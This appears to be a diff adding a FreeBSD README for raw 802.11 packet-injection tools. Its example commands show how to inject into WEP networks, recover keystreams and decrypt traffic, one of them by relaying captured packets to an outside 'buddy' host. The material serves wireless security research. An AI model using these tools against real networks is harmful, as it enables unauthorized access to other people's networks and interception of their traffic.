@@ -1,0 +1,78 @@
+$FreeBSD$
+
+This is a collection of tools that use raw 802.11 packet injection.
+None of the tools configure the interface, so be sure to run something
+like:
+
+ifconfig wlan create wlandev ath0 wlanmode ahdemo channel 7 promisc up
+
+beforehand.  The following tools are found here:
+
+assoc	A wifi client.
+ap	A wifi access point.
+
+prga	Gives ability to transmit on a WEP network.
+redir	Gives ability to decrypt in real-time on a WEP network, via Internet.
+expand	Gives ability to decrypt locally on a WEP network.
+
+All these tools depend on:
+
+libw00t	Utility functions used by all tools.
+
+Detailed explanation of tools.
+==============================
+
+assoc:
+
+Acts as a wifi client.  It will associate to a network and bind a
+tap interface to it.  The interface may be used like a standard eth
+interface attached to a normal LAN.  Multiple instances of the
+program may be run in order to connect to multiple APs simultaneously.
+Example:
+
+./assoc -s w00t -t tap0
+ifconfig tap0 192.168.0.123 up
+ping 192.168.0.1
+
+ap:
+
+The same as assoc, but acts as an access point.  Example:
+
+./ap -s w00t -t tap1
+ifconfig tap1 192.168.0.1 up
+tcpdump -n -i tap1
+
+[For the next set of tools, refer to http://tapir.cs.ucl.ac.uk/bittau-wep.pdf
+for theoretical information.]
+
+prga:
+
+Sniff a packet on a WEP network and obtain a keystream.  It binds
+to a tap interface which may be used to TX packets on that network.
+Example:
+
+./prga -b bssid_of_network -t tap0
+ifconfig tap0 192.168.0.123 up
+ping 192.168.0.1
+
+redir:
+
+Resend WEP packets to our buddy on the Internet.  The buddy will
+receive the clear-text and send it back to us via a UDP socket.
+This data is then fed back into a tap interface.  This way, data
+may be ultimately be read from the tab iface in clear-text.  Example:
+
+[Box on Internet]~# ./buddy
+./redir -d buddy_ip -b bssid -t tap0 -r wifi_rtr_mac -s wifi_src_ip -p 666
+ifconfig tap0 up
+tcpdump -n -i tap0
+
+expand:
+
+Sniff a WEP packet and do the linear keystream expansion trick to
+decrypt it.  The clear-text packet is sent to a tap interface.
+Example:
+
+./expand -b bssid -t tap0
+ifconfig tap0 up
+tcpdump -n -i tap0
